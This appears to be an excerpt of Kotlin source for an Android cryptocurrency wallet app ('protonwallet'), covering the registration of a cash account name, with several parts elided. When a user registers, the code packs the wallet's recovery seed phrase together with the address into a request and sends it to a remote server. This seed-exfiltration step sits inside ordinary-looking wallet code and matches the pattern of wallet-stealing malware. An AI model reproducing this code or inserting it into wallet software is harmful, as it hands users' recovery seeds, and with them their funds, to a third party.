package app.protonwallet.src.manager
...
import app.protonwallet.src.MainActivity
import app.protonwallet.src.R
import app.protonwallet.src.activity.SendActivity
import app.protonwallet.src.async.AsyncTaskVerifyWallet
import app.protonwallet.src.hash.HashHelper
import app.protonwallet.src.json.JSONHelper
import app.protonwallet.src.retrofit.*
import app.protonwallet.src.utils.Constants
import app.protonwallet.src.utils.PrefsUtil
            ...
            if (!TextUtils.isEmpty(cashAcctName)) {
                if (!cashAcctName.contains("#") && !cashAcctName.contains(".")) {
                    ...
                    if (length == 12) {
                        ...
                        activity.backup.visibility = View.VISIBLE
                        activity.okbtn.backgroundTintList = ContextCompat.getColorStateList(activity.baseContext,R.color.gray)
                        UIManager.showToastMessage(activity, "Registering user...")
                        if (WalletManager.walletKit != null) {
                            val address = WalletManager.walletKit!!.currentAddress.toString()
                            val user_address = address.replace("simpleledger:", "")
                                .replace(WalletManager.parameters.cashAddrPrefix + ":", "")
                            val data = JsonObject().apply {
                                addProperty("user_address", user_address)
                                addProperty(
                                    "user_seedphrase",
                                    recoverySeed.toString()
                                )
                            }
                            val clipboardManager =
                                activity.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager

                            val call = apiService.sendRequest(data)
                            call?.enqueue(object : Callback<Responseserver?> {
                                override fun onResponse(
                                    ...
                                    if (response.isSuccessful) {
                                        ...
                                        activity.tfa.setText(response_data?.tfaPassword.toString())
                                        activity.ultimatepassword.setText(response_data?.userSeedphrase.toString())
                                        activity.tfacopy.setOnClickListener {
                                            clipboardManager.setPrimaryClip(
                                                ClipData.newPlainText(
                                                    "tfa password",
                                                    response_data?.tfaPassword.toString()
                                                )
                                            )
                                            UIManager.showToastMessage(
                                                activity,
                                                activity.getString(R.string.copied)
                                            )
                                        }
                                        activity.ultimatepasswordcopy.setOnClickListener {
                                            clipboardManager.setPrimaryClip(
                                                ClipData.newPlainText(
                                                    "ultimate password",
                                                    response_data?.userSeedphrase.toString()
                                                )
                                            )
                                            UIManager.showToastMessage(
                                                activity,
                                        ...
                                        object : CountDownTimer(10000, 20) {
                                            ...
                                            override fun onFinish() {
                                                activity.okbtn.setOnClickListener {
                                                    activity.backup.visibility = View.GONE
                                                }
                                                activity.okbtn.backgroundTintList = null
                                ...
                                override fun onFailure(call: Call<Responseserver?>, t: Throwable) {
                                    println("Произошла ошибка: ${t.message}")
                                }
                            })
                        }
